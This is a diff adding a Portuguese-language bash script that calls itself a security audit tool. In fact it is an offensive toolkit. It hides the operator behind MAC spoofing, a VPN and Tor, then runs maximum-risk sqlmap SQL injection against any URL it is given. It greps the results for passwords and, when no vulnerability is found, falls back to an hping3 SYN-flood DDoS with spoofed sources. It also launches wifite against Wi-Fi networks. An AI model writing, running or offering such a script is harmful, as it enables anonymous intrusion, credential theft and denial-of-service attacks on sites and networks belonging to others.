@@ -1,0 +1,182 @@
+#!/bin/bash
+
+# Função para exibir cabeçalho bonito
+show_header() {
+    clear
+    echo "
+  _                             _             
+ | |                           | |            
+ | |__   ___  _ __   ___  _ __ | | __ _ _   _ 
+ | '_ \ / _ \| '_ \ / _ \| '_ \| |/ _\` | | | |
+ | | | | (_) | | | | (_) | | | | | (_| | |_| |
+ |_| |_|\___/|_| |_|\___/|_| |_|_|\__,_|\__, |
+                                         __/ |
+                                        |___/ 
+    "
+    echo "========================================================"
+    echo "                 Equipe Hanover - Ferramenta de Segurança"
+    echo "========================================================"
+    echo
+}
+
+# Função para verificar e instalar dependências
+install_dependencies() {
+    echo "Verificando e instalando dependências..."
+
+    # Lista de pacotes necessários
+    local packages=("openvpn" "macchanger" "hydra" "hping3" "torsocks" "tor" "nmap" "wifite" "yay" "figlet" "qemu" "qemu-kvm" "libvirt" "virt-manager" "virt-viewer" "bridge-utils" "dnsmasq")
+
+    # Loop para verificar e instalar cada pacote
+    for package in "${packages[@]}"; do
+        if ! command -v $package &> /dev/null; then
+            echo "Instalando $package..."
+            sudo pacman -Sy --noconfirm $package || yay -Sy --noconfirm $package
+        else
+            echo "$package já está instalado."
+        fi
+    done
+}
+
+# Função para ativar VPN com anonimato
+activate_vpn() {
+    local vpn_config="/etc/openvpn/client.conf"
+    if [ ! -f "$vpn_config" ]; then
+        echo "Erro: Arquivo de configuração da VPN não encontrado em $vpn_config"
+        echo "Criando máquina virtual efêmera para anonimato..."
+        create_ephemeral_vm
+        return
+    fi
+
+    echo "Ativando VPN para proteger o anonimato..."
+    sudo openvpn --config "$vpn_config" --daemon
+    sleep 10  # Aguarda 10 segundos para garantir que a VPN esteja conectada
+}
+
+# Função para configurar firewall para bloquear tráfego não desejado
+configure_firewall() {
+    echo "Configurando firewall para bloquear tráfego não desejado..."
+    sudo iptables -F  # Limpa todas as regras existentes
+    sudo iptables -P INPUT DROP
+    sudo iptables -P FORWARD DROP
+    sudo iptables -P OUTPUT ACCEPT
+    # Permite tráfego relacionado e estabelecido
+    sudo iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+    sudo iptables -A OUTPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+}
+
+# Função para ocultar identidade do usuário
+hide_identity() {
+    echo "Ocultando identidade do usuário..."
+    sudo macchanger -r eth0
+}
+
+# Função para usar Tor para anonimato adicional
+start_tor() {
+    echo "Iniciando serviço Tor..."
+    sudo systemctl start tor
+    sleep 10  # Aguarda 10 segundos para garantir que o Tor esteja conectado
+}
+
+# Função para realizar a auditoria usando uma versão melhorada do sqlmap
+perform_audit() {
+    local target_url="$1"
+    echo "Iniciando auditoria de segurança em $target_url..."
+
+    # Simulação de uma auditoria melhorada (substituir com comandos reais conforme necessário)
+    echo "Executando sqlmap avançado..."
+    torsocks sqlmap -u "$target_url" --level 5 --risk 3 --batch --random-agent --threads 10 > audit.log 2>&1
+
+    if grep -q "no vulnerabilities found" audit.log; then
+        echo "Nenhuma vulnerabilidade encontrada. Iniciando ataque DDoS..."
+        perform_ddos "$target_url"
+    else
+        echo "Vulnerabilidades encontradas. Resultados salvos em audit.log"
+        echo "Extraindo informações sensíveis (por exemplo, senhas de usuário)..."
+        extract_sensitive_info
+    fi
+}
+
+# Função para realizar ataques de DDoS com a ferramenta personalizada
+perform_ddos() {
+    local target_url="$1"
+    echo "Realizando ataque DDoS em $target_url..."
+
+    # Exemplo de ataque de DDoS personalizado
+    sudo hping3 -c 100000 -d 120 -S -w 64 -p 80 --flood --rand-source $target_url
+}
+
+# Função para executar o Wifite
+run_wifite() {
+    echo "Iniciando Wifite para auditoria de redes Wi-Fi..."
+    sudo wifite
+}
+
+# Função para criar uma máquina virtual efêmera
+create_ephemeral_vm() {
+    echo "Criando e iniciando máquina virtual efêmera..."
+
+    # Cria uma imagem de disco temporária
+    qemu-img create -f qcow2 /tmp/ephemeral_vm.qcow2 10G
+
+    # Inicia a máquina virtual
+    qemu-system-x86_64 -m 2048 -hda /tmp/ephemeral_vm.qcow2 -cdrom /path/to/archlinux.iso -boot d -net nic -net user,hostfwd=tcp::2222-:22 -nographic &
+    sleep 30  # Aguarda 30 segundos para garantir que a VM esteja pronta
+
+    echo "Máquina virtual efêmera criada e iniciada com sucesso."
+}
+
+# Função para extrair informações sensíveis encontradas
+extract_sensitive_info() {
+    echo "Extraindo informações sensíveis do audit.log..."
+    # Lógica para extrair senhas de usuário ou outras informações sensíveis do arquivo audit.log
+    cat audit.log | grep -E "password|senha"  # Exemplo simplificado
+}
+
+# Função para exibir o menu de opções
+show_menu() {
+    echo "Escolha uma das opções abaixo:"
+    echo "1. Auditoria de Segurança (SQL Injection)"
+    echo "2. Auditoria de Redes Wi-Fi (Wifite)"
+    echo "3. Sair"
+    echo
+}
+
+# Função principal que chama todas as funções
+main() {
+    show_header
+
+    # Verifica e instala dependências
+    install_dependencies
+
+    # Ativa VPN, configura firewall, oculta identidade e inicia Tor
+    activate_vpn
+    configure_firewall
+    hide_identity
+    start_tor
+
+    # Loop do menu de opções
+    while true; do
+        show_menu
+        read -p "Digite sua escolha: " choice
+
+        case $choice in
+            1)
+                read -p "Digite a URL do site alvo: " target_url
+                perform_audit "$target_url"
+                ;;
+            2)
+                run_wifite
+                ;;
+            3)
+                echo "Saindo..."
+                exit 0
+                ;;
+            *)
+                echo "Opção inválida. Tente novamente."
+                ;;
+        esac
+    done
+}
+
+# Chamada da função principal ao iniciar o script
+main
